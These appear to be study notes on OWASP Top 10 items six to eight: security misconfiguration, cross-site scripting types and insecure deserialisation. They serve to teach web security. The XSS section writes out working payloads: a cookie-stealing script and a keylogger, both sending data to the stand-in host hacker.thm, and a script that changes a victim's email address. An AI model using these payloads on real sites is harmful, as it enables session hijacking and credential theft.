##################################
#####OWASP###############
#############TOP 10 ATTACKS#####################
###############LAST FIVE###################

6) Security Misconfiguration :
    Poorly configured permissions on cloud services, like S3 buckets
    Having unnecessary features enabled, like services, pages, accounts or privileges
    Default accounts with unchanged passwords
    Error messages that are overly detailed and allow an attacker to find out more about the system
    Not using HTTP security headers, or revealing too much detail in the Server: HTTP header
This vulnerability can often lead to more vulnerabilities, such as default credentials giving you access to sensitive data, 
XXE or command injection on admin pages.

7) Cross Site Scripting XSS :
    Cross-site scripting, also known as XSS is a security vulnerability typically found in web applications. 
    It’s a type of injection which can allow an attacker to execute malicious scripts and have it execute on a victim’s machine.

    A web application is vulnerable to XSS if it uses unsanitized user input. 
    XSS is possible in Javascript, VBScript, Flash and CSS. There are three main types of cross-site scripting:

        -Stored XSS - the most dangerous type of XSS. This is where a malicious string originates from the website’s database. 
            This often happens when a website allows user input that is not sanitised (remove the "bad parts" of a users input) when inserted into the database.
        -Reflected XSS - the malicious payload is part of the victims request to the website. (GET REQUEST Intercepeted and Reflected by 3rd Party)
            The website includes this payload in response back to the user. 
            To summarise, an attacker needs to trick a victim into clicking a URL to execute their malicious payload.
        -DOM-Based XSS - DOM stands for Document Object Model and is a programming interface for HTML and XML documents. 
            It represents the page so that programs can change the document structure, style and content. 
            A web page is a document and this document can be either displayed in the browser window or as the HTML source.

    XSS Payloads :
       Exploited to execute malicious Javascript on a victim’s machine :
       
            -Popup's (<script>alert(“Hello World”)</script>) - Creates a Hello World message popup on a users browser.
            -Writing HTML (document.write) - Override the website's HTML to add your own (essentially defacing the entire page).
            -XSS Keylogger (http://www.xss-payloads.com/payloads/scripts/simplekeylogger.js.html) - You can log all keystrokes of a user, capturing their password and other sensitive information they type into the webpage.

            -XSS-Payloads.com (http://www.xss-payloads.com/) is a website that has XSS related Payloads, Tools, Documentation and more. You can download XSS payloads that take snapshots from a webcam or even get a more capable port and network scanner.


            XSS Payloads
   
            Session Stealing:
            Details of a user’s session, such as login tokens, are often kept in cookies on the targets machine. 
            The below JavaScript takes the target’s cookie, base64 encodes the cookie to ensure successful transmission and then posts it to a website under the hacker’s control to be logged. 
            Once the hacker has these cookies, they can take over the target’s session and be logged as that user.

                -<script> fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>

            Key Logger:
            The below code acts as a key logger. This means anything you type on the webpage will be forwarded to a website under the hacker’s control. 
            This could be very damaging if the website the payload was installed on accepted user logins or credit card details.

                -<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>

            Business Logic:
            This payload is a lot more specific than the above examples. 
            This would be about calling a particular network resource or a JavaScript function. For example, 
            imagine a JavaScript function for changing the user’s email address called user.changeEmail(). Your payload could look like this:

                -<script>user.changeEmail('attacker@hacker.thm');</script>

            Now that the email address for the account has changed, the attacker may perform a reset password attack.

8) Insecure Deserialisation :
    Replacing data processed by an application with malicious code; 
    allowing anything from DoS (Denial of Service) to RCE (Remote Code Execution) that the attacker can use to gain a foothold in a pentesting scenario.

    - Low exploitability. This vulnerability is often a case-by-case basis 
    - there is no reliable tool/framework for it. Because of its nature, attackers need to have a good understanding of the inner-workings of the ToE.

    - The exploit is only as dangerous as the attacker's skill permits, more so, the value of the data that is exposed. 
    For example, someone who can only cause a DoS will make the application unavailable. The business impact of this will vary on the infrastructure - some organisations will recover just fine, others, however, will not.

    At summary, ultimately, any application that stores or fetches data where there are no validations or integrity checks in place for the data queried or retained. 
    A few examples of applications of this nature are:
        - E-Commerce Sites
        - Forums
        - API's
        - Application Runtimes (Tomcat, Jenkins, Jboss, etc)